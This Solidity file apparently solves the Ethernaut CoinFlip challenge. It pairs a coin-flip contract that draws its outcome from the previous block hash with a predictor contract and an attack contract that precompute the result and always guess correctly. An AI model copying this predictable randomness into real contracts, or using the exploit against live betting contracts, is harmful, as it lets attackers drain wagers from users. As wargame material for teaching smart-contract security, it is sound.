// SPDX-License-Identifier: MIT
pragma solidity =0.8.25;

contract EthernautCoinFlip {
    uint256 public consecutiveWins;
    uint256 public lastHash;
    uint256 private immutable FACTOR = 2 ** 255;

    function flip(bool guess) public returns (bool) {
        uint256 blockValue = uint256(blockhash(block.number - 1));
        uint256 coinFlip = blockValue / FACTOR;
        bool side = coinFlip == 1;

        if (lastHash == blockValue) revert("Same block");
        lastHash = blockValue;

        if (side == guess) {
            consecutiveWins++;
            return true;
        }
        consecutiveWins = 0;
        return false;
    }
}

contract CoinFlipPredictor {
    uint256 private immutable FACTOR = 2 ** 255;

    function predict() external view returns (bool) {
        uint256 blockValue = uint256(blockhash(block.number - 1));
        return blockValue / FACTOR == 1;
    }
}

contract CoinFlipAttack {
    uint256 private immutable FACTOR = 2 ** 255;

    function attack(EthernautCoinFlip target) external returns (bool) {
        uint256 blockValue = uint256(blockhash(block.number - 1));
        bool guess = blockValue / FACTOR == 1;
        return target.flip(guess);
    }
}

